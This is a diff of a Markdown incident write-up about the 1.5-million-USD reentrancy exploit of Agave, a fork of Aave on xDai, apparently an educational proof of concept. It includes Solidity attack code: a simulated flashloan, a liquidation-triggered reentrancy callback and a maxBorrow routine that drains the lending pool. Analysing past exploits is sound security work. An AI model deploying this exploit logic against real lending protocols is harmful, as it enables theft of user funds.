@@ -4,11 +4,15 @@
 
 Agave ($AGVE) is a decentralized money market protocol on the xDai chain, developed by the 1Hive community as a fork of Aave. Agave integrates features from 1Hive projects like Celeste and Honeyswap.
 
-Users deposit tokens, receiving 'aTokens' that accrue interest and can be used as collateral for borrowing. This enables leveraged returns with lower fees than mainnet Ethereum. Agave expands 1Hive's offerings, allowing users to earn yield on Honeyswap liquidity tokens. Explore Agave's capabilities, including lending, borrowing, delegated borrowing, and flash loans/
+Users deposit tokens, receiving 'aTokens' that accrue interest and can be used as collateral for borrowing. This enables leveraged returns with lower fees than mainnet Ethereum. Agave expands 1Hive's offerings, allowing users to earn yield on Honeyswap liquidity tokens. Explore Agave's capabilities, including lending, borrowing, delegated borrowing, and flash loans.
 
 ## Amount stolen
 
-1.5 million usd
+1.5 million USD
+
+## Vurnebality
+
+Reentrancy
 
 ## proof of concept (PoC) 
 
@@ -74,24 +78,28 @@ Ensure that the health factor is initially slightly above 1.
 **Reasoning:**
 The health factor is important in DeFi platforms, especially those involving lending and borrowing. It is a measure of an account's collateralization level, indicating the ratio of the value of assets to the value of outstanding liabilities. A health factor above 1 indicates that the account has sufficient collateral to cover its liabilities.
 
+#### Transition - Advance Time by One Hour
+**Objective:**
+Advance time by one hour after the initial prepare.
+
+**Reasoning**
+This time advancement is part of a simulation scenario to trigger changes in the account's health factor or to simulate the passage of time, allowing for dynamic testing.
+
 #### Liquidation Mechanism
 A liquidation mechanism in place to protect the system from insolvency. When an account's health factor falls below 1, it may become eligible for liquidation.
-
-#### Transition - Advance Time by One Hour
-This time advancement is part of a simulation scenario to trigger changes in the account's health factor or to simulate the passage of time, allowing for dynamic testing.
 
 
 #### Purpose -  Liquidation Call:
 
 To get the health factor below 1, you would typically need to ensure that the borrowed amount exceeds the collateral value. The health factor is calculated based on the ratio of collateral to debt. If this ratio falls below 1, the health factor drops below the threshold, indicating potential insolvency.
 
-- Deposit a substantial amount of LINK (1_000_000_000_000_000_100) into the lending pool, designating it as collateral
+- Deposit a large amount of LINK (1_000_000_000_000_000_100) into the lending pool, designating it as collateral
 
 - Deposit a minimal amount of WETH (1) into the lending pool, designating it as collateral.
 
 - Set both LINK and WETH as collateral assets in the lending pool, allowing them to be used as security for borrowing.
 
-- Borrow a substantial amount of LINK (700_000_000_000_000_000) from the lending pool with a borrow factor of 2. The borrow factor influences the amount that can be borrowed relative to the collateral.
+- Borrow a large amount of LINK (700_000_000_000_000_000) from the lending pool with a borrow factor of 2. The borrow factor influences the amount that can be borrowed relative to the collateral.
 
 - Borrow a minimal amount of WETH (1) from the lending pool with a borrow factor of 2.
 
@@ -137,26 +145,32 @@ These actions collectively set up a scenario where you have a significant LINK d
 
 
 
-    2. Flashloan and Deposit Phase:
+### Flashloan and Deposit Phase
    - Action: Execute a flashloan and deposit tokens.
    - Exploited Assets: In this exploit, withdraw and borrow all funds from WETH and maximize borrowing from all available pools.
 
+
+This function initiates a flashloan by calling **`uniswapV2Call`** with a specified amount of WETH (2730 ether). The actual flashloan logic is implemented in the **`attackLogic`** function.
 
 ```solidity
   function flashloanFundingWETH() internal {
         this.uniswapV2Call(address(this), 2730 ether, 0, new bytes(0));
     }
 ```
-
-
+This function simulates a flashloan from Uniswap, passing control to the **`attackLogic`** function with the flashloan amount, another token amount, and additional data.
 ```solidity
-      function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
+  function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
         //We simulate a flashloan from uniswap for initial eth funding
         attackLogic(_amount0, _amount1, _data);
     }
 ```
 
 
+- Calculates the flashloan amount and sets it as totalBorrowed.
+- Adjusts the block timestamp and number to simulate the passage of time, causing the health factor to decrease.
+- Initiates a liquidation call on the WETH asset, triggering a reentrancy attack.
+- Withdraws funds from the WETH lending pool.
+- Calculates the flashloan fees and repays the flashloan by transferring WETH to address(1).
 
 ```solidity
     function attackLogic(uint256 _amount0, uint256 _amount1, bytes calldata _data) internal {
@@ -186,11 +200,9 @@ These actions collectively set up a scenario where you have a significant LINK d
     
 ```
 
-
-
-Now the attack contract would receive a call :
-
-
+This function is called externally when a token transfer occurs.
+It monitors the transfer events, specifically for WETH tokens (aweth) with a value of 1, indicating a specific stage in the reentrancy attack.
+After detecting the second occurrence of this event, it calls borrowMaxtokens to maximize borrowing.
 
 
 ```solidity
@@ -209,25 +221,26 @@ Now the attack contract would receive a call :
 ```
 
 
-
+<details>
+  <summary>maxBorrow Function</summary>
 
 ```solidity
-    function maxBorrow(address asset, bool maxxx) internal {
-        IERC20 assetX = IERC20(asset);
-        uint256 assetXbal = assetX.balanceOf(address(this));
-        uint256 reserveTokenbal = getAvailableLiquidity(asset);
-        console.log("Amont of asset bal in atoken is %d", reserveTokenbal);
-        uint256 BorrowAmount = maxxx ? reserveTokenbal - 1 : min(getMaxBorrow(asset, totalBorrowed), reserveTokenbal);
-        if (BorrowAmount > 0) {
-            console.log("Going to boorrow %d of asset %s", BorrowAmount, asset);
-            lendingPool.borrow(asset, BorrowAmount, 2, 0, address(this));
-            uint256 diff = assetX.balanceOf(address(this)) - assetXbal;
-            require(diff == BorrowAmount, "did not borrow any funds");
-            console.log("borrowed %d successfully", BorrowAmount);
-        } else {
-            console.log("NO amount borrowed???");
-        }
+function maxBorrow(address asset, bool maxxx) internal {
+    IERC20 assetX = IERC20(asset);
+    uint256 assetXbal = assetX.balanceOf(address(this));
+    uint256 reserveTokenbal = getAvailableLiquidity(asset);
+    console.log("Amont of asset bal in atoken is %d", reserveTokenbal);
+    uint256 BorrowAmount = maxxx ? reserveTokenbal - 1 : min(getMaxBorrow(asset, totalBorrowed), reserveTokenbal);
+    if (BorrowAmount > 0) {
+        console.log("Going to boorrow %d of asset %s", BorrowAmount, asset);
+        lendingPool.borrow(asset, BorrowAmount, 2, 0, address(this));
+        uint256 diff = assetX.balanceOf(address(this)) - assetXbal;
+        require(diff == BorrowAmount, "did not borrow any funds");
+        console.log("borrowed %d successfully", BorrowAmount);
+    } else {
+        console.log("NO amount borrowed???");
     }
+}
 ```
 
 
@@ -260,13 +273,12 @@ Now the attack contract would receive a call :
         }
         return (maxBorrowAmount * 100) / 100;
     }
-
 ```
+</details>
 
 
-
-    3. Exploit Completion:
-   - Result: Successful execution drains funds from the lending pool.
+### Exploit Completion:
+Successful execution drains funds from the lending pool.
 
 
 
